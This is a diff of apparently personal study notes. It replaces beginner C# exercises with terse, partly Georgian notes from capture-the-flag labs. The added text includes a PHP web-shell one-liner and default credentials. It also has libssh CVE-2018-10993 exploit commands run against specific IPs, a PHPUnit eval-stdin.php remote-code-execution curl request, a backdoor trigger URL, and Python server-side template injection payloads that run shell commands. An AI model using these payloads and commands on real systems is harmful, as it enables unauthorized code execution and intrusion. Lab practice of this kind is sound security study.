@@ -1,239 +1,47 @@
-1.
+1. Bolt:
 
-using System;
+<?php echo system($_GET['cmd']);?>
 
-class Program
-{
-    static void Main()
-    {
-        int score = 85;
-
-        if (score >= 90)
-        {
-            Console.WriteLine("Excellent");
-        }
-        else if (score >= 70)
-        {
-            Console.WriteLine("Good");
-        }
-        else
-        {
-            Console.WriteLine("Needs Improvement");
-        }
-    }
-}
+paroli:password
+user:admin
 
 2.
 
-using System;
-
-class BankAccount
-{
-    private double balance;
-    public string OwnerName { get; set; }
-
-    public BankAccount(string ownerName, double initialBalance)
-    {
-        OwnerName = ownerName;
-        balance = initialBalance;
-    }
-
-    public void Deposit(double amount)
-    {
-        balance += amount;
-    }
-
-    public void Withdraw(double amount)
-    {
-        if (amount <= balance)
-        {
-            balance -= amount;
-        }
-        else
-        {
-            Console.WriteLine("Not enough balance!");
-        }
-    }
-
-    public double GetBalance()
-    {
-        return balance;
-    }
-}
-
-class Program
-{
-    static void Main()
-    {
-        BankAccount acc = new BankAccount("Giorgi", 1000);
-
-        acc.Deposit(500);
-        acc.Withdraw(300);
-
-        Console.WriteLine("Final Balance: " + acc.GetBalance());
-    }
-}
+Elastic:msfconsole gamoikene thats it
+cve 2015 5531
 
 
-3.
+3. libssh:
 
-using System;
+cve 2018-10993 githubidan mygeekys iwer
+python3 /home/kali/Desktop/libssh/cve-2018-10993.py  34.159.185.40 -p 32623 -c "ls /"
+python3 /home/kali/Desktop/libssh/cve-2018-10993.py  34.159.185.40 -p 32623 -c "cat / flag.txt"
 
-class Employee
-{
-    protected double salary;
 
-    public Employee(double salary)
-    {
-        this.salary = salary;
-    }
+4. php unit:
 
-    public virtual double CalculateBonus()
-    {
-        return salary * 0.1;
-    }
-}
+dirsearach usage. lurji chaketili direktoriebi ver shevalt. /composer.json -> version number
+mwvane-gvawkobs ra egenia gia.
 
-class Manager : Employee
-{
-    public Manager(double salary) : base(salary) { }
+Use the following:
+/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+the command: curl -X POST
+35.242.218.207:32111//vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php --data
+"<?php system('ls -la');?>"      php 5.6.2
 
-    public override double CalculateBonus()
-    {
-        return salary * 0.2;
-    }
-}
+5. non diff backdoor:
 
-class Developer : Employee
-{
-    public Developer(double salary) : base(salary) { }
+A backdoor in pentesting is a covert method used to bypass normal authentication, providing unauthorized, persistent remote access to a system, application, or network.
 
-    public override double CalculateBonus()
-    {
-        return salary * 0.15;
-    }
-}
+view-source:http://34.185.185.43:31753/?welldone=knockknock&shazam=cat%20flag.php -amoxsna
+unzip backup.zip -d backup                            grep -r "shell_exec"
 
-class Program
-{
-    static void Main()
-    {
-        Manager m = new Manager(5000);
-        Developer d = new Developer(4000);
 
-        Console.WriteLine("Manager Bonus: " + m.CalculateBonus());
-        Console.WriteLine("Developer Bonus: " + d.CalculateBonus());
-    }
-}
+6. shark: 
+burpit vamowmebt server aris Server: Werkzeug/2.0.3 Python/3.6.9   reflected xss mushaobs.
+ssti vcadot server side template injection when the server runs your input as code instead of showing it as text
+${7*7}=gamoqvs 49
 
-4.
-
-using System;
-
-interface ILogger
-{
-    void Log(string message);
-}
-
-class ConsoleLogger : ILogger
-{
-    public void Log(string message)
-    {
-        Console.WriteLine(message);
-    }
-}
-
-class FileLogger : ILogger
-{
-    public void Log(string message)
-    {
-        Console.WriteLine("Writing to file: " + message);
-    }
-}
-
-class Program
-{
-    static void Main()
-    {
-        ILogger logger1 = new ConsoleLogger();
-        ILogger logger2 = new FileLogger();
-
-        logger1.Log("Hello Console");
-        logger2.Log("Hello File");
-    }
-}
-
-5.
-
-using System;
-using System.Collections.Generic;
-
-class MyList<T> where T : IComparable<T>
-{
-    private List<T> items = new List<T>();
-
-    public void Add(T item)
-    {
-        items.Add(item);
-    }
-
-    public T Max()
-    {
-        if (items.Count == 0)
-            throw new InvalidOperationException("List is empty");
-
-        T max = items[0];
-
-        foreach (var item in items)
-        {
-            if (item.CompareTo(max) > 0)
-            {
-                max = item;
-            }
-        }
-
-        return max;
-    }
-}
-
-5.2
-
-using System;
-
-class Student : IComparable<Student>
-{
-    public string Name { get; set; }
-    public int Score { get; set; }
-
-    public Student(string name, int score)
-    {
-        Name = name;
-        Score = score;
-    }
-
-    public int CompareTo(Student other)
-    {
-        return this.Score.CompareTo(other.Score);
-    }
-
-    public override string ToString()
-    {
-        return Name + " - " + Score;
-    }
-}
-
-class Program
-{
-    static void Main()
-    {
-        MyList<Student> students = new MyList<Student>();
-
-        students.Add(new Student("Ana", 85));
-        students.Add(new Student("Giorgi", 92));
-        students.Add(new Student("Nino", 78));
-
-        Student topStudent = students.Max();
-
-        Console.WriteLine("Top Student: " + topStudent);
-    }
-}
+${__import__('os').popen('ls').read()}
+${__import__('os').popen('cat flag').read()}
+${__import('os').popen('ls').read()}
